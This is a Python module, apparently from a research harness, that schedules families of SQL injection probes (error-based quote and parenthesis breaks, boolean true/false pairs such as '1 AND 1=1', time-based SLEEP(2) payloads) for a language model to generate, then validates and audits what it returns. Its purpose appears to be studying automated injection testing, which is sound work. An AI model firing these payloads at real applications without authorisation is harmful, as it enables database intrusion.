"""Laguna generation profile with unit-wide structural-family scheduling.

Family reference values are used only to assign distinct structural families.
Model outputs still pass through the existing parser and candidate policy.
"""

from __future__ import annotations

from dataclasses import dataclass
import hashlib
from itertools import product
import json
from pathlib import Path

import qwen_api_generation as parser
import run_qwen_api_experiments as active
import poolside_laguna_generation_v2 as base_profile
import poolside_laguna_generation_v3_no_examples as v3_profile
from qwen_api_runtime import APIRuntimeFailure


PROMPT_VERSION = "poolside-laguna-sqli-generation-v4-unit-wide-family-scheduler"
RETRY_POLICY_ID = "poolside-unit-wide-unseen-family-fallback-v4"
RETRIEVAL_CONTEXT_POLICY_ID = "structured-chunks-remove-payload-examples-v1"
MAX_RETRIES_PER_SLOT = base_profile.MAX_RETRIES_PER_SLOT
MAX_FAMILIES_PER_PROBE = 40
MAX_HISTORY_PER_SLOT = base_profile.MAX_HISTORY_PER_SLOT
MAX_EXCERPT_CHARS = base_profile.MAX_EXCERPT_CHARS


@dataclass(frozen=True)
class Family:
    family_id: str
    description: str
    structural_key: str
    # Private scheduling reference. It is never added to the model request or audit.
    reference_values: tuple[str, ...]


def _candidate(probe_kind: str, values: tuple[str, ...]) -> dict:
    if probe_kind == "boolean_pair":
        return {"true_payload": values[0], "false_payload": values[1]}
    return {"payload": values[0]}


def _add_family(bank: list[Family], probe_kind: str, family_id: str,
                description: str, values: tuple[str, ...]) -> None:
    if len(bank) >= MAX_FAMILIES_PER_PROBE:
        return
    candidate = _candidate(probe_kind, values)
    scenario_id = {"single_error": "S1", "boolean_pair": "S2", "single_time": "S3"}[probe_kind]
    active.validate_candidate_policy(candidate, probe_kind, scenario_id)
    key = parser.structural_key(candidate, probe_kind)
    if any(family.structural_key == key for family in bank):
        return
    family_id = f"{family_id}-{key[:10]}"
    bank.append(Family(family_id, description, key, values))


def _error_families() -> tuple[Family, ...]:
    bank: list[Family] = []
    primary = (
        ("1'", "Append one unmatched single quote to the existing benign numeric input value."),
        ('1"', "Append one unmatched double quote to the existing benign numeric input value."),
        ("1`", "Append one unmatched backtick to the existing benign numeric input value."),
        ("1)", "Append one unmatched closing parenthesis to the existing benign numeric input value."),
        ("1(", "Append one unmatched opening parenthesis to the existing benign numeric input value."),
        ("1')", "Append one single quote followed by one unmatched closing parenthesis."),
        ('1")', "Append one double quote followed by one unmatched closing parenthesis."),
        ("1'(", "Append one single quote followed by one unmatched opening parenthesis."),
        ('1"(', "Append one double quote followed by one unmatched opening parenthesis."),
        ("1`)", "Append one backtick followed by one unmatched closing parenthesis."),
    )
    for index, (value, description) in enumerate(primary, 1):
        _add_family(bank, "single_error", f"error-primary-{index:02d}", description, (value,))

    tokens = (("'", "one unmatched single quote"), ('"', "one unmatched double quote"),
              ("`", "one unmatched backtick"), (")", "one unmatched closing parenthesis"),
              ("(", "one unmatched opening parenthesis"))
    index = 0
    for length in (2, 3, 1):
        for suffix in product(tokens, repeat=length):
            index += 1
            symbols = " followed by ".join(label for _, label in suffix)
            description = f"Append {symbols} at the existing benign numeric input boundary; keep this syntax-only."
            _add_family(bank, "single_error", f"error-boundary-{index:03d}", description,
                        ("1" + "".join(symbol for symbol, _ in suffix),))
            if len(bank) == MAX_FAMILIES_PER_PROBE:
                return tuple(bank)
    raise ValueError("Could not construct the frozen error-based family bank.")


def _boolean_pair(base: str, operator: str, *, grouped: bool = False,
                  quote: str = "", suffix: str = "") -> tuple[str, str]:
    true_left, true_right, false_left, false_right = {
        "=": ("1", "1", "1", "2"),
        "<>": ("1", "2", "1", "1"),
        ">": ("2", "1", "1", "2"),
        "<": ("1", "2", "2", "1"),
        ">=": ("2", "1", "1", "2"),
        "<=": ("1", "2", "2", "1"),
    }[operator]
    if quote:
        true_predicate = f"{quote}{true_left}{quote}{operator}{quote}{true_right}{quote}"
        false_predicate = f"{quote}{false_left}{quote}{operator}{quote}{false_right}{quote}"
    else:
        true_predicate = f"{true_left}{operator}{true_right}"
        false_predicate = f"{false_left}{operator}{false_right}"
    if grouped:
        true_expression = f"{base}({true_predicate}){suffix}"
        false_expression = f"{base}({false_predicate}){suffix}"
    else:
        true_expression = f"{base}{true_predicate}{suffix}"
        false_expression = f"{base}{false_predicate}{suffix}"
    return true_expression, false_expression


def _boolean_families() -> tuple[Family, ...]:
    bank: list[Family] = []
    primary = (
        ("numeric AND equality", ("1 AND 1=1", "1 AND 1=2")),
        ("numeric OR equality", ("0 OR 1=1", "0 OR 1=2")),
        ("parenthesized numeric equality", ("(1=1)", "(1=2)")),
        ("numeric greater-than", ("2>1", "1>2")),
        ("numeric less-than", ("1<2", "2<1")),
        ("numeric negated equality", ("NOT(1=2)", "NOT(1=1)")),
        ("numeric not-equal", ("1<>2", "1<>1")),
        ("parenthesized AND equality", ("(1 AND 1=1)", "(1 AND 1=2)")),
        ("parenthesized OR equality", ("(0 OR 1=1)", "(0 OR 1=2)")),
        ("numeric greater-than-or-equal", ("2>=1", "1>=2")),
    )
    for index, (label, values) in enumerate(primary, 1):
        _add_family(bank, "boolean_pair", f"boolean-primary-{index:02d}",
                    f"Use a matched true/false pair with the {label} structure; change only the truth condition and avoid delays.",
                    values)

    operators = ("=", "<>", ">", "<", ">=", "<=")
    shapes = (
        ("numeric AND", "1 AND ", "", False, ""),
        ("numeric OR", "0 OR ", "", False, ""),
        ("numeric XOR", "0 XOR ", "", False, ""),
        ("grouped AND", "1 AND ", "", True, ""),
        ("grouped OR", "0 OR ", "", True, ""),
        ("single-quoted AND boundary", "1' AND ", "", False, "'"),
        ("single-quoted OR boundary", "0' OR ", "", False, "'"),
        ("double-quoted AND boundary", '1" AND ', "", False, '"'),
        ("double-quoted OR boundary", '0" OR ', "", False, '"'),
    )
    index = 0
    for label, prefix, suffix, grouped, quote in shapes:
        for operator in operators:
            index += 1
            true_value, false_value = _boolean_pair(
                prefix, operator, grouped=grouped, quote=quote, suffix=suffix)
            description = (f"Keep the injection boundary and use a matched true/false {label} "
                           f"predicate with operator {operator}; vary only its truth condition.")
            _add_family(bank, "boolean_pair", f"boolean-expanded-{index:03d}", description,
                        (true_value, false_value))
            if len(bank) == MAX_FAMILIES_PER_PROBE:
                return tuple(bank)
    raise ValueError("Could not construct the frozen Boolean-based family bank.")


def _time_families() -> tuple[Family, ...]:
    bank: list[Family] = []
    primary = (
        ("numeric AND delay", "1 AND SLEEP(2)"),
        ("numeric OR delay", "1 OR SLEEP(2)"),
        ("single-quoted AND delay", "1' AND SLEEP(2)-- -"),
        ("single-quoted OR delay", "1' OR SLEEP(2)-- -"),
        ("grouped numeric AND delay", "(1 AND SLEEP(2))"),
        ("grouped numeric OR delay", "(1 OR SLEEP(2))"),
        ("numeric XOR delay", "1 XOR SLEEP(2)"),
        ("numeric negated delay", "1 AND NOT SLEEP(2)"),
        ("constant true IF branch", "IF(TRUE,SLEEP(2),0)"),
        ("constant true CASE result", "CASE WHEN TRUE THEN SLEEP(2) ELSE 0 END"),
    )
    for index, (label, value) in enumerate(primary, 1):
        _add_family(bank, "single_time", f"time-primary-{index:02d}",
                    f"Use the {label} structure with exactly one bounded SLEEP(2) and a matched no-delay control.",
                    (value,))

    prefixes = (
        ("numeric AND", "1 AND "), ("numeric OR", "1 OR "),
        ("numeric XOR", "1 XOR "), ("grouped AND", "(1 AND "),
        ("grouped OR", "(1 OR "), ("grouped XOR", "(1 XOR "),
        ("single-quoted AND boundary", "1' AND "),
        ("single-quoted OR boundary", "1' OR "),
        ("double-quoted AND boundary", '1" AND '),
        ("double-quoted OR boundary", '1" OR '),
    )
    expressions = (
        ("one delay expression", "SLEEP(2)"),
        ("negated delay expression", "NOT SLEEP(2)"),
        ("constant-true IF branch", "IF(TRUE,SLEEP(2),0)"),
        ("constant-true CASE expression", "CASE WHEN TRUE THEN SLEEP(2) ELSE 0 END"),
    )
    index = 0
    for label, prefix in prefixes:
        for expression_label, expression in expressions:
            index += 1
            suffix = ")" if label.startswith("grouped") else ("-- -" if "boundary" in label else "")
            description = (f"Use the {label} with a {expression_label}; include exactly one literal "
                           "SLEEP(2) and preserve the paired no-delay measurement.")
            _add_family(bank, "single_time", f"time-expanded-{index:03d}", description,
                        (prefix + expression + suffix,))
            if len(bank) == MAX_FAMILIES_PER_PROBE:
                return tuple(bank)
    raise ValueError("Could not construct the frozen time-based family bank.")


FAMILIES = {
    "single_error": _error_families(),
    "boolean_pair": _boolean_families(),
    "single_time": _time_families(),
}


def _family_for_request(probe_kind: str, slot_id: int, attempted: list,
                        requested_family_ids: set[str]) -> Family:
    """Pick the unused slot family first, then a distinct unused fallback family."""
    bank = FAMILIES.get(probe_kind)
    if bank is None or not 1 <= slot_id <= 10:
        raise ValueError("Unsupported probe kind or candidate slot.")
    occupied = {parser.structural_key(_candidate(probe_kind, (value,) if isinstance(value, str)
                                                  else tuple(parser.candidate_values(value, probe_kind))), probe_kind)
                for value in attempted}
    preferred = bank[slot_id - 1]
    ordered = (preferred, *(family for family in bank if family.family_id != preferred.family_id))
    for family in ordered:
        if family.family_id not in requested_family_ids and family.structural_key not in occupied:
            return family
    raise ValueError("The frozen family bank has no unused structural key for this unit.")


def select_family(probe_kind: str, slot_id: int, attempted: list,
                  requested_family_ids: set[str]) -> Family:
    """Public pure scheduler for deterministic offline replay and regression checks."""
    return _family_for_request(probe_kind, slot_id, attempted, requested_family_ids)


def strip_payload_examples(retrieval: dict | None) -> tuple[dict | None, int]:
    """Keep the tested Q2 retrieval projection and its read-only source behavior."""
    return v3_profile.strip_payload_examples(retrieval)


def _response_diagnostic(content: str, schema: dict) -> dict:
    return base_profile._response_diagnostic(content, schema)


def _remember_duplicate(parsed: dict, response: dict, rejected: list) -> None:
    return base_profile._remember_duplicate(parsed, response, rejected)


def make_generation_callback(api, attempt_directory: Path, scenario: dict,
                             retrieval: dict | None, baseline: dict, config: dict):
    projected_retrieval, removed_count = strip_payload_examples(retrieval)
    projected_context = active.safe_retrieval(projected_retrieval, config)
    probe_kind = scenario["probe_kind"]
    requested_family_ids: set[str] = set()
    duplicate_exclusions_by_slot: dict[int, list] = {}
    history_by_slot: dict[int, list[dict]] = {}

    def generate(previous, attempted, retry_index, rejection_code):
        if type(retry_index) is not int or not 0 <= retry_index <= MAX_RETRIES_PER_SLOT:
            raise ValueError("retry_index must be 0, 1, or 2.")
        slot_id = len(attempted) + 1
        if not 1 <= slot_id <= 10:
            raise ValueError("Candidate slot is outside the frozen v4 family schedule.")
        duplicate_exclusions = duplicate_exclusions_by_slot.setdefault(slot_id, [])
        family = _family_for_request(probe_kind, slot_id, [*attempted, *duplicate_exclusions],
                                     requested_family_ids)
        requested_family_ids.add(family.family_id)
        history = history_by_slot.setdefault(slot_id, [])

        prepared, messages = active.generation_messages(
            scenario, attempted, projected_context, baseline,
            active.feedback_projection(previous), retry_index, rejection_code)
        prepared.update(prompt_version=PROMPT_VERSION,
                        retry_policy_id=RETRY_POLICY_ID,
                        family_id=family.family_id,
                        family_structural_key=family.structural_key,
                        family_index=len(requested_family_ids),
                        family=family.description,
                        generation_attempt=retry_index)
        task = json.loads(messages[1]["content"])
        task["variation_family"] = {
            "index": prepared["family_index"],
            "description": family.description,
            "phase": "primary" if retry_index == 0 and family.family_id == FAMILIES[probe_kind][slot_id - 1].family_id else "unseen-structural-fallback",
        }
        task["generation_attempt"] = retry_index
        task["validation_feedback"] = list(history)
        task["same_slot_rejected_suggestions"] = list(duplicate_exclusions)
        messages[1]["content"] = json.dumps(task, ensure_ascii=False, separators=(",", ":"))

        api_result, checkpoint = api.chat("generation", messages, attempt_directory)
        parsed = parser.parse(prepared, [*attempted, *duplicate_exclusions], probe_kind, api_result)
        candidate = parsed["candidate"]
        final_status = parsed["status"]
        if candidate is not None:
            try:
                active.validate_candidate_policy(candidate, probe_kind, scenario["scenario_id"])
            except (KeyError, ValueError):
                final_status = "invalid_candidate_policy"

        audit = {
            **parsed["audit"],
            "status": final_status,
            "prompt_version": PROMPT_VERSION,
            "retry_policy_id": RETRY_POLICY_ID,
            "checkpoint": checkpoint,
            "variation_family": family.description,
            "family_id": family.family_id,
            "family_structural_key": family.structural_key,
            "family_phase": task["variation_family"]["phase"],
            "generation_attempt": retry_index,
            "unit_family_count": len(requested_family_ids),
            "same_slot_feedback_count": len(history),
            "unit_duplicate_exclusion_count": len(duplicate_exclusions),
            "retrieval_context_policy_id": RETRIEVAL_CONTEXT_POLICY_ID,
            "payload_examples_removed_from_retrieved_chunks": removed_count,
        }
        if final_status == "generated" and candidate is not None:
            value = candidate["payload"] if scenario["scenario_id"] == "S1" else candidate
            duplicate_exclusions_by_slot.pop(slot_id, None)
            history_by_slot.pop(slot_id, None)
            return value, audit
        if final_status == "model_service_error":
            raise APIRuntimeFailure("api_generation_response_unusable", {
                **checkpoint, "parse_status": final_status})

        if parsed["status"] == "no_valid_distinct_candidate":
            _remember_duplicate(parsed, api_result, duplicate_exclusions)
        elif final_status == "invalid_candidate_policy" and candidate is not None \
                and candidate not in duplicate_exclusions:
            duplicate_exclusions.append(candidate)
        content = api_result.get("content") if isinstance(api_result, dict) else ""
        content = content if isinstance(content, str) else ""
        diagnostic = (_response_diagnostic(content, prepared["schema"])
                      if parsed["status"] == "invalid_candidate_format"
                      else {"code": final_status})
        entry = {
            "attempt": retry_index,
            "status": final_status,
            "diagnostic": diagnostic,
            "response_sha256": hashlib.sha256(content.encode("utf-8")).hexdigest(),
            "response_excerpt_untrusted": content[:MAX_EXCERPT_CHARS],
        }
        history.append(entry)
        del history[:-MAX_HISTORY_PER_SLOT]
        audit.update(same_slot_feedback_count_after_request=len(history),
                     unit_duplicate_exclusion_count_after_request=len(duplicate_exclusions),
                     validation_diagnostic=diagnostic)
        return None, {**audit, "rejection_code": final_status}

    return generate
